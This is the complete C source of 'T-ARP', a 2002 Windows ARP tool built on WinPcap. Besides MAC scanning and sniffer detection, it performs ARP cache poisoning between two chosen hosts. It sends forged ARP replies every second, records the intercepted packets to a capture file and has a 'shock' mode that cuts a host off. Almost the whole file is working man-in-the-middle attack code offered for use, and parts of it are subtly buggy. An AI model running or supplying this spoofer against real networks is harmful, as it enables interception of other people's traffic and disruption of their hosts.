#include "packet32.h"
#include "ntddndis.h"
#include <stdio.h>
#include <conio.h>

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"packet")

#define ETH_IP       0x0800
#define ETH_ARP      0x0806
#define ARP_REQUEST  0x0001
#define ARP_REPLY    0x0002
#define ARP_HARDWARE 0x0001
#define max_num_adapter  10

#pragma pack(push,1)

typedef struct ethdr
{
	unsigned char   eh_dst[6];
	unsigned char   eh_src[6];
	unsigned short  eh_type;
}ETHDR,*PETHDR;

typedef struct arphdr
{
	unsigned short  arp_hdr;
	unsigned short  arp_pro;
	unsigned char   arp_hln;
	unsigned char   arp_pln;
	unsigned short  arp_opt;
	unsigned char   arp_sha[6];
	unsigned long   arp_spa;
	unsigned char   arp_tha[6];
	unsigned long   arp_tpa;
}ARPHDR,*PARPHDR;

typedef struct iphdr
{
	unsigned char  h_lenver;
	unsigned char  tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char  ttl;
	unsigned char  proto;
	unsigned short checksum;
	unsigned int   sourceip;
	unsigned int   destip;
}IPHDR,*PIPHDR;

#pragma pack(push)

LPADAPTER lpadapter=0;
LPPACKET  lppacketr,lppackets;
ULONG     myip,firstip,secondip;
UCHAR     mmac[6]={0},fmac[6]={0},smac[6]={0};
BOOL      mm=FALSE,fm=FALSE,sm=FALSE; 
FILE      *fp; 
char      adapterlist[max_num_adapter][1024];
char      msg[50];
int       num=0;

void start()
{
	printf("T-ARP --- ARP Tools, by TOo2y(ҹɫ), 11-9-2002\n");
	printf("Homepage: www.safechina.net\n");
	printf("E-mail: TOo2y@safechina.net\n");
	return ;
}

void usage()
{
	printf("\nUsage: T-ARP  [-m|-a|-s|-r]  firstip  secondip  \n\n");
	printf("Option:\n");
	printf("   -m  mac        Get the mac address from firstip to secondip\n");
	printf("   -a  antisniff  Get the sniffing host from firstip to secondip\n");
	printf("   -s  spoof      1> Spoof the host between firstip and secondip\n");
	printf("       sniff      2> Sniff if firstip == secondip == your own ip\n");
	printf("       shock      3> Shock if firstip == secondip != your own ip\n");
	printf("   -r  reset      Reset the spoofed host work normally\n\n");
	printf("Attention:\n");
	printf("    1> You must have installed the winpcap_2.3 or winpcap_3.0_alpha\n");
	printf("    2> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter == 0x1\n\n");
	return ;
}

int getmine()
{
	char   sendbuf[1024];
	int    k;
	ETHDR  eth;
	ARPHDR arp;

	for(k=0;k<6;k++)
	{
		eth.eh_dst[k]=0xff;
		eth.eh_src[k]=0x82;
		arp.arp_sha[k]=0x82;
		arp.arp_tha[k]=0x00;
	}
	eth.eh_type=htons(ETH_ARP);
	arp.arp_hdr=htons(ARP_HARDWARE);
	arp.arp_pro=htons(ETH_IP);
	arp.arp_hln=6;
	arp.arp_pln=4;
	arp.arp_opt=htons(ARP_REQUEST);
	arp.arp_tpa=htonl(myip);
	arp.arp_spa=inet_addr("112.112.112.112");

	memset(sendbuf,0,sizeof(sendbuf));
	memcpy(sendbuf,&eth,sizeof(eth));
	memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

	PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
	if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
	{
		printf("PacketSendPacket in getmine Error: %d\n",GetLastError());
		return -1;             
	}
	return 0;
}

void getdata(LPPACKET lp,int op) 
{
	ULONG  ulbytesreceived,off,tlen,ulen,ulLines;
	ULONG  j,k;
	ETHDR  *eth;
	ARPHDR *arp;
	PIPHDR ip;
	char   *buf,*pChar,*pLine,*base;
	struct bpf_hdr      *hdr;
	struct sockaddr_in  sin;

	ulbytesreceived=lp->ulBytesReceived;
	buf=(char *)lp->Buffer;

	off=0;
	while(off<ulbytesreceived)
	{
		if(kbhit())
		{
			return ;
		}
		hdr=(struct bpf_hdr *)(buf+off);
		off+=hdr->bh_hdrlen;

		pChar=(char *)(buf+off);
		base=pChar;
		off=Packet_WORDALIGN(off+hdr->bh_caplen);

		eth=(PETHDR)pChar;                
		arp=(PARPHDR)(pChar+sizeof(ETHDR)); 

		if(eth->eh_type==htons(ETH_IP)) 
		{
    		ip=(PIPHDR)(pChar+sizeof(ETHDR));

			if(fm && sm && (op==3))  
			{  
				if((((ip->sourceip!=htonl(myip)) && (ip->destip!=htonl(myip)) && !strcmp((char *)eth->eh_dst,(char *)mmac)) 
				&& ((ip->sourceip==htonl(firstip)) || (ip->destip==htonl(firstip)) 
				|| (ip->sourceip==htonl(secondip)) || (ip->destip==htonl(secondip))))
                || ((firstip==myip) && (secondip==myip)))
				{
					memset(msg,0,sizeof(msg));

					sin.sin_addr.s_addr=ip->sourceip;				
					printf("[IP:]%16s ---> [IP:]",inet_ntoa(sin.sin_addr));

                    strcpy(msg,inet_ntoa(sin.sin_addr));
					strcat(msg+15," ---> ");

					sin.sin_addr.s_addr=ip->destip;
					printf("%16s\n",inet_ntoa(sin.sin_addr));
                   
					strcat(msg+23,inet_ntoa(sin.sin_addr));
					fseek(fp,-2,1);
					fwrite("\r\n\r\n\r\n",6,1,fp);
					fwrite(msg,38,1,fp);
					fwrite("\r\n",2,1,fp);

					ulLines=(hdr->bh_caplen+15)/16;
					for(k=0;k<ulLines;k++)
					{
						pLine=pChar;
						printf("%08lx : ",pChar-base);

						ulen=tlen;
						ulen=(ulen>16) ? 16 : ulen;
						tlen-=ulen;

						for(j=0;j<ulen;j++)
							printf("%02x ",*(BYTE *)pChar++);

						if(ulen<16)
							printf("%*s",(16-ulen)*3," ");

						pChar=pLine;

						for(j=0;j<ulen;j++,pChar++)
						{
							printf("%c",isprint(*pChar)? *pChar : '.');
							fputc(isprint(*pChar) ? *pChar : '.',fp); 
						}
						printf("\n");
					}
					printf("\n");
                    fwrite("\r\n",2,1,fp);  
				}

			}
			continue;
		}
	    else if((eth->eh_type==htons(ETH_ARP)) && (arp->arp_opt==htons(ARP_REPLY)))  
		{
    		sin.sin_addr.s_addr=arp->arp_spa;

     		if(sin.sin_addr.s_addr==htonl(myip)) 
			{
	    		memcpy(mmac,eth->eh_src,6);
		    	if(!mm)
				{
			    	printf("\t");    
	     	    	for(k=0;k<5;k++)
	    		    	printf("%.2x-",eth->eh_src[k]);
	          		printf("%.2x\n",eth->eh_src[5]);

                	switch(op)
					{
                	case 1:
             	    	printf("\n[MAC LIST:]");
                		break;
                 	case 2:
	                	printf("\n[Sniffing Host:]");     
	                 	break;
                  	default:                    
	                 	break;
					}
				}
		    	mm=TRUE;
			}

    		if((op==1) || (op==2))
			{
		    	printf("\n[IP:] %.16s\t[MAC:] ",inet_ntoa(sin.sin_addr));
		    	for(k=0;k<5;k++)
			    	printf("%.2x-",eth->eh_src[k]);
		    	printf("%.2x",eth->eh_src[5]);

			}
	    	else if(((op==3) || (op==4)) && (!fm || !sm))
			{
	    		if(arp->arp_spa==htonl(firstip))
				{
			    	memcpy(fmac,eth->eh_src,6);
			    	fm=TRUE;
				}
			    
				if(arp->arp_spa==htonl(secondip))
				{
			    	memcpy(smac,eth->eh_src,6);
			    	sm=TRUE;
				}
			}
		}
	}
	return ;
}
			
DWORD WINAPI sniff(LPVOID no)
{
	int      option=*(int *)no;
	char     recvbuf[1024*250];

	if(PacketSetHwFilter(lpadapter,NDIS_PACKET_TYPE_PROMISCUOUS)==FALSE)
	{
		printf("Warning: Unable to set the adapter to promiscuous mode\n");
	}

	if(PacketSetBuff(lpadapter,500*1024)==FALSE)
	{
		printf("PacketSetBuff Error: %d\n",GetLastError());
		return -1;
	}

	if(PacketSetReadTimeout(lpadapter,1)==FALSE)
	{
		printf("Warning: Unable to set the timeout\n");
	}

	if((lppacketr=PacketAllocatePacket())==FALSE)
	{
		printf("PacketAllocatePacket receive Error: %d\n",GetLastError());
		return -1;
	}

	PacketInitPacket(lppacketr,(char *)recvbuf,sizeof(recvbuf));

	while(!kbhit())
	{
		if(PacketReceivePacket(lpadapter,lppacketr,TRUE)==FALSE)
		{
	    	return -1;
		}
		getdata(lppacketr,option);
	}
	return 0;
}

DWORD WINAPI sendMASR(LPVOID no)
{
	int    fun=*(int *)no;
	int    k,stimes;
    char   sendbuf[1024];
	ETHDR  eth;
	ARPHDR arp;
 
	if(fun<1 || fun>4)
	{
		return -1;
	}
	else
	{
		for(k=0;k<6;k++)
		{
			eth.eh_dst[k]=0xff;
			arp.arp_tha[k]=0x00;
		}
		if(fun==2)
			eth.eh_dst[5]=0xfe;
	}

	memcpy(eth.eh_src,mmac,6);
	eth.eh_type=htons(ETH_ARP);

	arp.arp_hdr=htons(ARP_HARDWARE);
	arp.arp_pro=htons(ETH_IP);
	arp.arp_hln=6;
	arp.arp_pln=4;
	arp.arp_opt=htons(ARP_REQUEST);
	arp.arp_spa=htonl(myip);
	memcpy(arp.arp_sha,mmac,6);

	if(fun==1 || fun==2)
		stimes=1;
	else if(fun==3 || fun==4)
		stimes=2;

	for(k=0;k<stimes;k++)
	{
		if(stimes==1)
		{
			arp.arp_tpa=htonl(firstip+(num++));
		}
		else if(stimes==2)
		{
			switch(k)
			{
			case 0:
				arp.arp_tpa=htonl(firstip);
				break;
			case 1:
				arp.arp_tpa=htonl(secondip);
				break;
			default:
				break;
			}
		}

		memset(sendbuf,0,sizeof(sendbuf));
		memcpy(sendbuf,&eth,sizeof(eth));
		memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

		PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in sendMASR Error: %d\n",GetLastError());
			return -1;
		}
	}
	return 0;
}
		
DWORD WINAPI sendSR(LPVOID no)
{
	int     fun=*(int *)no;
	int     j,k;
	char    sendbuf[1024];
	struct  sockaddr_in  fsin,ssin;
	BOOL    stimes=FALSE;
	ETHDR   eth;
	ARPHDR  arp;

	fsin.sin_addr.s_addr=htonl(firstip);
	ssin.sin_addr.s_addr=htonl(secondip);

	eth.eh_type=htons(ETH_ARP);
	arp.arp_hdr=htons(ARP_HARDWARE);
	arp.arp_pro=htons(ETH_IP);
	arp.arp_hln=6;
	arp.arp_pln=4;
   	arp.arp_opt=htons(ARP_REPLY);       

	if(fun==3)
	{
    	if(mm)
		{
			if((firstip==myip) && (secondip==myip))
			{
		    	fm=TRUE;
		    	sm=TRUE;

				memcpy(fmac,mmac,6);
				memcpy(smac,mmac,6);
			}
			else if(!fm || !sm)
			{
		    	printf("\nNot get enough data\n"); 
		    	return -1;
			}

			for(j=0;j<2;j++)
			{
				if(j==0)
				{
					printf("\nSpoofing %.16s :  ",inet_ntoa(fsin.sin_addr));
					printf("%.16s ==> ",inet_ntoa(ssin.sin_addr));
				}
				else if(j==1)
				{
					printf("Spoofing %.16s :  ",inet_ntoa(ssin.sin_addr));
					printf("%.16s ==> ",inet_ntoa(fsin.sin_addr));
				}
                for(k=0;k<5;k++)
			    	printf("%.2x-",mmac[k]);
		    	printf("%.2x\n",mmac[5]);
			}
			printf("\ni will try to snoof ...\n\n");
    		stimes=TRUE;
		}
		else 
		{
				printf("\nNot get enough data\n"); 
    			return -1;
		}
	}
	else if(fun==4)
	{
		if(mm) 
		{
			if((firstip==myip) && (secondip==myip))
			{
    			fm=TRUE;
    			sm=TRUE;

				memcpy(fmac,mmac,6);
				memcpy(smac,mmac,6);
			}
			else if(!fm || !sm)
			{
		    	printf("\nNot get enough data\n");
		    	return -1;
			}

			printf("\nReset %.16s :  ",inet_ntoa(fsin.sin_addr));
			printf("%.16s ==> ",inet_ntoa(ssin.sin_addr));

            for(k=0;k<5;k++)
		    	printf("%.2x-",smac[k]);
	    	printf("%.2x\n",smac[5]);

			printf("Reset %.16s :  ",inet_ntoa(ssin.sin_addr));
			printf("%.16s ==> ",inet_ntoa(fsin.sin_addr));

            for(k=0;k<5;k++)
		    	printf("%.2x-",fmac[k]);
	    	printf("%.2x\n\n",fmac[5]);

    		stimes=FALSE;
		}
		else 
		{
				printf("\nNot get enough data\n"); 
    			return -1;
		}
	}
	else
		return -1;

	do
	{
		memcpy(eth.eh_dst,fmac,6);
		memcpy(arp.arp_tha,fmac,6);
		arp.arp_tpa=htonl(firstip);
		arp.arp_spa=htonl(secondip);

		if(!stimes)
		{
			memcpy(eth.eh_src,smac,6);
			memcpy(arp.arp_sha,smac,6);
		}
		else
		{
			memcpy(eth.eh_src,mmac,6);
			memcpy(arp.arp_sha,mmac,6);
		}

		memset(sendbuf,0,sizeof(sendbuf));
		memcpy(sendbuf,&eth,sizeof(eth));
		memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

		PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));

    	if(PacketSetNumWrites(lpadapter,2)==FALSE)
		{
   			printf("Warning: Unable to send a packet 2 times\n");
		}

		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in SendSR Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(1000);  

		memcpy(eth.eh_dst,smac,6);
		memcpy(arp.arp_tha,smac,6);
		arp.arp_tpa=htonl(secondip);
		arp.arp_spa=htonl(firstip);

		if(!stimes)
		{
			memcpy(eth.eh_src,fmac,6);
			memcpy(arp.arp_sha,fmac,6);
		}
        else	
		{
			memcpy(eth.eh_src,mmac,6);
			memcpy(arp.arp_sha,mmac,6);
		}


		memset(sendbuf,0,sizeof(sendbuf));
		memcpy(sendbuf,&eth,sizeof(eth));
		memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));

		PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket int sendSR Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(1000);
	}while(stimes);

	if(fun==4)
		printf("Reset Successfully");

	return 0;
}

int main(int argc,char *argv[])
{
	HANDLE   sthread,rthread;
	WCHAR    adaptername[8192];
	WCHAR    *name1,*name2;
	ULONG    adapterlength;
	DWORD    threadsid,threadrid;
	struct   NetType      ntype;
	struct   bpf_stat     stat;
	struct   sockaddr_in  sin;
	struct   npf_if_addr  ipbuff;
	int      adapternum=0,opti=0,open,i,total;
	long     npflen;

	system("cls.exe");
	start();

	if(argc!=4)
	{
		usage();
		getche();
		return -1;
	}
	else
	{
		if(!strcmp(argv[1],"-m"))
		{
			opti=1;
		}
		else if(!strcmp(argv[1],"-a"))
		{
			opti=2;
		}
		else if(!strcmp(argv[1],"-s"))
		{
	 		opti=3;

         	if((fp=fopen("capture.txt","w+"))==NULL)
			{
	        	printf("Open capture.txt Error: %d\n");
    	    	return -1;
			}
    	    else
			{
                fwrite("T-ARP Captrue Data",20,1,fp);
			}
		}
		else if(!strcmp(argv[1],"-r"))
		{
			opti=4;
		}
		else
		{
			usage();
			getche();
			return -1;
		}
	}


	firstip=ntohl(inet_addr(argv[2]));
	secondip=ntohl(inet_addr(argv[3]));
	total=secondip-firstip+1;

	printf("\nLibarary Version: %s",PacketGetVersion());

	adapterlength=sizeof(adaptername);

	if(PacketGetAdapterNames((char *)adaptername,&adapterlength)==FALSE)
	{
		printf("PacketGetAdapterNames Error: %d\n",GetLastError());
		return -1;
	}
	
	name1=adaptername;
	name2=adaptername;
	i=0;

	while((*name1!='\0') || (*(name1-1)!='\0'))
	{
		if(*name1=='\0')
		{
			memcpy(adapterlist[i],name2,2*(name1-name2));
			name2=name1+1;
			i++;
		}
		name1++;
	}

	adapternum=i;
	printf("\nAdapters Installed:\n");
	for(i=0;i<adapternum;i++)
		wprintf(L"%d - %s\n",i+1,adapterlist[i]);

	do
	{
		printf("\nSelect the number of the adapter to open: ");
		scanf("%d",&open);
		if(open>=1 && open<=adapternum)
			break;         
	}while(open<1 || open>adapternum);

	lpadapter=PacketOpenAdapter(adapterlist[open-1]);

	if(!lpadapter || (lpadapter->hFile==INVALID_HANDLE_VALUE))
	{
		printf("PacketOpenAdapter Error: %d\n",GetLastError());
		return -1;
	}

	if(PacketGetNetType(lpadapter,&ntype))
	{
		printf("\n\t\t*** Host Information ***\n");
		printf("[LinkTpye:]\t%d\t\t",ntype.LinkType);    
		printf("[LinkSpeed:]\t%d b/s\n",ntype.LinkSpeed);
	}

	npflen=sizeof(ipbuff);  
	if(PacketGetNetInfoEx(adapterlist[open-1],&ipbuff,&npflen))
	{
		sin=*(struct sockaddr_in *)&(ipbuff.Broadcast);
		printf("[Broadcast:]\t%.16s\t",inet_ntoa(sin.sin_addr));

		sin=*(struct sockaddr_in *)&(ipbuff.SubnetMask);
		printf("[SubnetMask:]\t%.16s\n",inet_ntoa(sin.sin_addr));

		sin=*(struct sockaddr_in *)&(ipbuff.IPAddress);
		printf("[IPAddress:]\t%.16s\t",inet_ntoa(sin.sin_addr));
		myip=ntohl(sin.sin_addr.s_addr);

		printf("[MACAddress:]");
	}
	else
	{
		printf("\nNot get enough data\n");
		PacketFreePacket(lppackets);
		PacketCloseAdapter(lpadapter);
		return -1;
	}

	if((lppackets=PacketAllocatePacket())==FALSE)
	{
		printf("PacketAllocatePacket send Error: %d\n",GetLastError());
		return -1;
	}

	rthread=CreateThread(NULL,0,sniff,(LPVOID)&opti,0,&threadrid);
	Sleep(300);

	if(getmine()) 
	{
    	PacketFreePacket(lppackets);
    	PacketFreePacket(lppacketr);

    	PacketCloseAdapter(lpadapter);
		return -1;
	}
	Sleep(300);

	if((opti==1) || (opti==2))
	{
		for(i=0;i<total;i++)
		{
			sthread=CreateThread(NULL,0,sendMASR,(LPVOID)&opti,0,&threadsid);
			Sleep(30);
		}
		Sleep(1000);
	}
	else if((opti==3) || (opti==4)) 
	{
		sthread=CreateThread(NULL,0,sendMASR,(LPVOID)&opti,0,&threadsid);
		Sleep(300);
		CloseHandle(sthread);

		sthread=CreateThread(NULL,0,sendSR,(LPVOID)&opti,0,&threadsid);
	}

	WaitForSingleObject(sthread,INFINITE); 
	CloseHandle(sthread);
	CloseHandle(rthread);

	if(PacketGetStats(lpadapter,&stat)==FALSE)
	{
		printf("Warning: Unable to get the adapter stat\n");
	}
	else
	{
		printf("\n\n%d packets received, %d packets lost !\n",stat.bs_recv,stat.bs_drop);
	}
	PacketFreePacket(lppackets);
	PacketFreePacket(lppacketr);

	PacketCloseAdapter(lpadapter);

	return 0;
}

